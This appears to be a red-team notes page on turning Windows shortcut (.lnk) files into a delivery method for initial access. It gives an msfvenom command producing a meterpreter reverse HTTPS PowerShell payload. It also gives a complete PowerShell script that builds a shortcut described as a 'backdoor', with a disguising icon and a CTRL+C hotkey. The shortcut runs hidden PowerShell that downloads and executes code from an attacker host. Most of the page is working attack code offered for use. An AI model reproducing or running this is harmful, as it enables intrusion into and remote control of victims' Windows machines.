# Manual

> [!INFO]
> Windows shortcut link (`.lnk`) is often referred as **Shell Link**.

## 01 - Custom Icons

TODO: Add custom icons from the [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xB - Client-Side Attacks/Delivery Methods/File Attachment/Shortcut File/Windows/Helpers|helpers]].

```
C:\Windows\System32\msi.dll
C:\Program Files (x86)\Microsoft Office\root\Office16\WINWORD.exe
```

## 02 - Generate Shortcut

### 2.1 - PowerShell

> [!NOTE] Characters Limit
> The **TargetPath** has a limit of 260 characters long. If you're using powershell payload then it's recommended to use `psh-cmd` format instead of `psh`, `psh-reflection`, and `psh-net`.

```
$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=<IP> lport=<PORT> exitfunc=thread -f psh-cmd | sed 's/%COMSPEC% \/b \/c start \/b \/min powershell\.exe -nop -w hidden -e //g' | base64 -d > payload.ps1
```

Then generate the `.lnk` payload.

```powershell
$WScriptShell = New-Object -ComObject WScript.Shell
$ShortcutPath = "C:\Users\" + $Env:USERNAME + "\Desktop\mal.lnk"
$Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
$Shortcut.TargetPath = 'conhost.exe'
$Shortcut.Arguments = "--headless powershell.exe -nop -NonI -Nologo -w hidden -c `"IEX ((new-object net.webclient).downloadstring(`'http[s]://<attacker_IP>/payload.ps1`'))`"`""
$Shortcut.Description = "A shortcut backdoor"
$Shortcut.IconLocation = 'shell32.dll,21'
$Shortcut.HotKey = 'CTRL+C' # A hotkey to trigger the payload
$Shortcut.WindowStyle = 7   # 1 - Normal, 3 - Maximized, 7 - Minimized
$Shortcut.WorkingDirectory = "C:\Users\" + $Env:USERNAME + "\Public"
$Shortcut.Save()
```

---
## References

### Backlinks

- [[01 - Capture Hashes via Spoof SMB Shares|Responder: Capture Hashes via Spoof SMB Shares Scenario]]

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xB - Client-Side Attacks/Authentication Relay/Metasploit|Metasploit: Capture Hashes]]

- [[HTA Web Server|Metasploit: HTA Web Server]]

- [[SMB Delivery|Metasploit: SMB Delivery]]

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xB - Client-Side Attacks/Delivery Methods/File Attachment/Web Drive-by/Linux/C2 Frameworks|Metasploit: Web Delivery]]

### Source Repositories

- [nobodyatall648: Malicious LNK File Abuse Hotkey Feature](https://github.com/nobodyatall648/Malicious-LNK-File-Abuse-Hotkey-Feature)

- [B00merang-Artwork: Windows 10](https://github.com/B00merang-Artwork/Windows-10)